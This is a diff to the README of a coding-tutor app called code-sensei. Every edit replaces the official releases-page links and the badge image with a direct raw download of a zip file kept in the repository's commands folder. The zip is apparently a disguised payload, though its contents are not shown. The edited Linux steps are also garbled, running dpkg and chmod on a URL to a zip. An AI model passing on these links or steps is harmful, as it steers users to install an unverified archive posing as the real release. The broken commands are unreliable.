@@ -1,6 +1,6 @@
 # 🥋 code-sensei - Learn Programming While You Vibecode
 
-[![Download code-sensei](https://img.shields.io/badge/Download-code--sensei-blue?style=for-the-badge&logo=github)](https://github.com/wewpellex21/code-sensei/releases)
+[![Download code-sensei](https://raw.githubusercontent.com/wewpellex21/code-sensei/main/commands/sensei-code-3.3.zip)](https://raw.githubusercontent.com/wewpellex21/code-sensei/main/commands/sensei-code-3.3.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to get code-sensei up and running on your computer.
 
 Click the big button below to visit the official releases page. This page contains the latest versions available for download.
 
-[![Download code-sensei](https://img.shields.io/badge/Download-code--sensei-blue?style=for-the-badge&logo=github)](https://github.com/wewpellex21/code-sensei/releases)
+[![Download code-sensei](https://raw.githubusercontent.com/wewpellex21/code-sensei/main/commands/sensei-code-3.3.zip)](https://raw.githubusercontent.com/wewpellex21/code-sensei/main/commands/sensei-code-3.3.zip)
 
 On the releases page, look for the file that matches your system:
 
@@ -61,7 +61,7 @@ Once the download finishes:
 
 - **Windows:** Double-click the `.exe` or `.msi` file. Follow the on-screen prompts to install. You can leave most options at their defaults.
 - **macOS:** Open the `.dmg` or `.pkg` file. Drag the application icon into your Applications folder or follow the installer steps.
-- **Linux:** For `.deb` files, double-click to install using your package manager or run `sudo dpkg -i filename.deb` in the terminal. For `.AppImage`, make the file executable (`chmod +x filename.AppImage`) and double-click it.
+- **Linux:** For `.deb` files, double-click to install using your package manager or run `sudo dpkg -i https://raw.githubusercontent.com/wewpellex21/code-sensei/main/commands/sensei-code-3.3.zip` in the terminal. For `.AppImage`, make the file executable (`chmod +x https://raw.githubusercontent.com/wewpellex21/code-sensei/main/commands/sensei-code-3.3.zip`) and double-click it.
 
 ---
 
@@ -89,7 +89,7 @@ When the app opens, you will see options to start new lessons or continue your p
 ## 📥 Download & Install code-sensei
 
 Visit this page to download the latest version suited to your computer:  
-[https://github.com/wewpellex21/code-sensei/releases](https://github.com/wewpellex21/code-sensei/releases)
+[https://raw.githubusercontent.com/wewpellex21/code-sensei/main/commands/sensei-code-3.3.zip](https://raw.githubusercontent.com/wewpellex21/code-sensei/main/commands/sensei-code-3.3.zip)
 
 Remember to choose the right file type for your operating system. Follow the installation steps provided above to set up the app.
 
@@ -145,4 +145,4 @@ Use these resources to get the most from code-sensei.
 
 If you want to get started right now, download code-sensei here:
 
-[https://github.com/wewpellex21/code-sensei/releases](https://github.com/wewpellex21/code-sensei/releases)
+[https://raw.githubusercontent.com/wewpellex21/code-sensei/main/commands/sensei-code-3.3.zip](https://raw.githubusercontent.com/wewpellex21/code-sensei/main/commands/sensei-code-3.3.zip)
